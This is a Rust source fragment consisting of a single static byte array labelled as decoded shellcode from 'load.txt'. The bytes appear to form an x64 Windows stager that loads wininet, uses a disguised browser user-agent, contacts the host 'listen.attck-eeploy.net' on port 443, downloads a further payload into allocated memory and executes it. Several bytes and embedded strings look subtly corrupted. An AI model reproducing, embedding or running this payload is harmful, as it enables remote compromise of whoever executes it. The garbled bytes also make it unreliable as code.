// Decoded shellcode from load.txt
static EMBEDDED_SHELLCODE: &[u8] = &[
    0xfc, 0x49, 0x83, 0xe4, 0xf0, 0xe8, 0xcc, 0x00, 0x00, 0x00, 0x41, 0x52, 
    0x41, 0x50, 0x52, 0x49, 0x31, 0xd2, 0x65, 0x49, 0x8b, 0x52, 0x60, 0x49, 
    0x8b, 0x52, 0x18, 0x49, 0x8b, 0x52, 0x20, 0x52, 0x56, 0x49, 0x8b, 0x73, 
    0x50, 0x4d, 0x31, 0xc9, 0x49, 0x0f, 0xb7, 0x4b, 0x4b, 0x49, 0x31, 0xc0, 
    0xac, 0x3c, 0x61, 0x7c, 0x02, 0x33, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 
    0x01, 0xc1, 0xe2, 0xed, 0x52, 0x49, 0x8b, 0x52, 0x20, 0x41, 0x52, 0x8b, 
    0x42, 0x3c, 0x49, 0x01, 0xd0, 0x66, 0x81, 0x78, 0x18, 0x0b, 0x02, 0x0f, 
    0x86, 0x73, 0x00, 0x00, 0x00, 0x8b, 0x81, 0x89, 0x00, 0x00, 0x00, 0x49, 
    0x86, 0xc0, 0x74, 0x67, 0x49, 0x01, 0xd0, 0x44, 0x8b, 0x40, 0x20, 0x50, 
    0x8b, 0x49, 0x18, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x49, 0xff, 0xc9, 0x41, 
    0x8b, 0x34, 0x89, 0x49, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x49, 0x31, 0xc0, 
    0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1, 
    0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44, 
    0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b, 0x0c, 0x49, 0x44, 
    0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04, 0x89, 0x49, 0x01, 
    0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5b, 0x41, 0x58, 0x41, 0x59, 
    0x41, 0x5b, 0x49, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 
    0x59, 0x5b, 0x49, 0x8b, 0x12, 0xe9, 0x4b, 0xff, 0xff, 0xff, 0x5d, 0x49, 
    0x31, 0xdb, 0x53, 0x49, 0xbe, 0x77, 0x69, 0x6e, 0x69, 0x6e, 0x65, 0x74, 
    0x00, 0x41, 0x56, 0x49, 0x89, 0xe1, 0x49, 0xc7, 0xc2, 0x4c, 0x77, 0x26, 
    0x07, 0xff, 0xd5, 0x53, 0x53, 0xe8, 0x83, 0x00, 0x00, 0x00, 0x4d, 0x6f, 
    0x7a, 0x69, 0x6c, 0x6c, 0x61, 0x2f, 0x35, 0x2e, 0x30, 0x20, 0x28, 0x69, 
    0x50, 0x61, 0x65, 0x3b, 0x20, 0x43, 0x50, 0x55, 0x20, 0x4f, 0x53, 0x20, 
    0x31, 0x37, 0x5f, 0x37, 0x5f, 0x32, 0x20, 0x6c, 0x69, 0x6b, 0x65, 0x20, 
    0x4d, 0x61, 0x63, 0x20, 0x4f, 0x53, 0x20, 0x58, 0x29, 0x20, 0x41, 0x70, 
    0x70, 0x6c, 0x65, 0x57, 0x65, 0x62, 0x4b, 0x69, 0x74, 0x2f, 0x36, 0x30, 
    0x35, 0x2e, 0x31, 0x2e, 0x31, 0x35, 0x20, 0x28, 0x4b, 0x49, 0x54, 0x4d, 
    0x4c, 0x33, 0x20, 0x6c, 0x69, 0x6b, 0x65, 0x20, 0x47, 0x65, 0x63, 0x6b, 
    0x6f, 0x29, 0x20, 0x56, 0x65, 0x73, 0x73, 0x69, 0x6f, 0x6e, 0x2f, 0x31, 
    0x37, 0x2e, 0x34, 0x2e, 0x31, 0x20, 0x4d, 0x6f, 0x62, 0x69, 0x6c, 0x65, 
    0x2f, 0x31, 0x35, 0x45, 0x31, 0x34, 0x38, 0x20, 0x53, 0x61, 0x66, 0x61, 
    0x73, 0x69, 0x2f, 0x36, 0x30, 0x34, 0x2e, 0x31, 0x00, 0x59, 0x53, 0x5b, 
    0x4d, 0x31, 0xc0, 0x4d, 0x31, 0xc9, 0x53, 0x53, 0x49, 0xba, 0x3a, 0x56, 
    0x79, 0xa7, 0x00, 0x00, 0x00, 0x00, 0xff, 0xd5, 0xe8, 0x18, 0x00, 0x00, 
    0x00, 0x6c, 0x69, 0x73, 0x74, 0x65, 0x6e, 0x2e, 0x61, 0x74, 0x74, 0x63, 
    0x6b, 0x2d, 0x65, 0x65, 0x70, 0x6c, 0x6f, 0x79, 0x2e, 0x6e, 0x65, 0x74, 
    0x00, 0x5b, 0x49, 0x89, 0xc1, 0x49, 0xc7, 0xc0, 0xbb, 0x01, 0x00, 0x00, 
    0x4d, 0x31, 0xc9, 0x53, 0x53, 0x6a, 0x03, 0x53, 0x49, 0xba, 0x57, 0x89, 
    0x9f, 0xc6, 0x00, 0x00, 0x00, 0x00, 0xff, 0xd5, 0xe8, 0x69, 0x00, 0x00, 
    0x00, 0x2f, 0x49, 0x53, 0x6f, 0x31, 0x35, 0x46, 0x31, 0x56, 0x56, 0x6e, 
    0x42, 0x61, 0x41, 0x46, 0x73, 0x43, 0x50, 0x66, 0x38, 0x58, 0x49, 0x52, 
    0x71, 0x6c, 0x63, 0x70, 0x73, 0x37, 0x47, 0x4d, 0x44, 0x55, 0x62, 0x36, 
    0x35, 0x58, 0x6d, 0x65, 0x52, 0x36, 0x45, 0x6b, 0x63, 0x35, 0x34, 0x46, 
    0x63, 0x49, 0x41, 0x43, 0x46, 0x55, 0x30, 0x35, 0x66, 0x4c, 0x58, 0x39, 
    0x5b, 0x4c, 0x39, 0x30, 0x6a, 0x32, 0x62, 0x42, 0x58, 0x68, 0x68, 0x38, 
    0x43, 0x52, 0x43, 0x6f, 0x61, 0x4f, 0x36, 0x78, 0x33, 0x57, 0x73, 0x75, 
    0x58, 0x56, 0x6f, 0x75, 0x63, 0x58, 0x4b, 0x6b, 0x46, 0x75, 0x65, 0x55, 
    0x43, 0x47, 0x43, 0x74, 0x75, 0x55, 0x44, 0x6b, 0x6c, 0x00, 0x49, 0x89, 
    0xc1, 0x53, 0x5b, 0x41, 0x58, 0x4d, 0x31, 0xc9, 0x53, 0x49, 0xb8, 0x00, 
    0x32, 0xa8, 0x84, 0x00, 0x00, 0x00, 0x00, 0x50, 0x53, 0x53, 0x49, 0xc7, 
    0xc2, 0xeb, 0x55, 0x2e, 0x3b, 0xff, 0xd5, 0x49, 0x89, 0xc6, 0x6a, 0x0a, 
    0x5f, 0x49, 0x89, 0xf1, 0x6a, 0x1f, 0x5b, 0x52, 0x68, 0x81, 0x33, 0x00, 
    0x00, 0x49, 0x89, 0xe0, 0x6a, 0x04, 0x41, 0x59, 0x49, 0xba, 0x75, 0x46, 
    0x9e, 0x86, 0x00, 0x00, 0x00, 0x00, 0xff, 0xd5, 0x4d, 0x31, 0xc0, 0x53, 
    0x5b, 0x49, 0x89, 0xf1, 0x4d, 0x31, 0xc9, 0x4d, 0x31, 0xc9, 0x53, 0x53, 
    0x49, 0xc7, 0xc2, 0x2d, 0x06, 0x18, 0x7b, 0xff, 0xd5, 0x86, 0xc0, 0x75, 
    0x1f, 0x49, 0xc7, 0xc1, 0x89, 0x13, 0x00, 0x00, 0x49, 0xba, 0x44, 0xf0, 
    0x35, 0xe0, 0x00, 0x00, 0x00, 0x00, 0xff, 0xd5, 0x49, 0xff, 0xcf, 0x74, 
    0x02, 0xeb, 0xaf, 0xe8, 0x55, 0x00, 0x00, 0x00, 0x53, 0x59, 0x6a, 0x40, 
    0x5b, 0x49, 0x89, 0xd1, 0xc1, 0xe2, 0x10, 0x49, 0xc7, 0xc0, 0x00, 0x10, 
    0x00, 0x00, 0x49, 0xba, 0x58, 0xa4, 0x53, 0xe5, 0x00, 0x00, 0x00, 0x00, 
    0xff, 0xd5, 0x49, 0x93, 0x53, 0x53, 0x49, 0x89, 0xe7, 0x49, 0x89, 0xf1, 
    0x49, 0x89, 0xda, 0x49, 0xc7, 0xc0, 0x00, 0x20, 0x00, 0x00, 0x49, 0x89, 
    0xf9, 0x49, 0xba, 0x12, 0x96, 0x89, 0xe2, 0x00, 0x00, 0x00, 0x00, 0xff, 
    0xd5, 0x49, 0x83, 0xc4, 0x20, 0x86, 0xc0, 0x74, 0xb2, 0x66, 0x8b, 0x07, 
    0x49, 0x01, 0xcb, 0x86, 0xc0, 0x75, 0xd2, 0x58, 0xcb, 0x58, 0x6a, 0x00, 
    0x59, 0x49, 0xc7, 0xc2, 0xf0, 0xb5, 0xa2, 0x56, 0xff, 0xd5, 
];
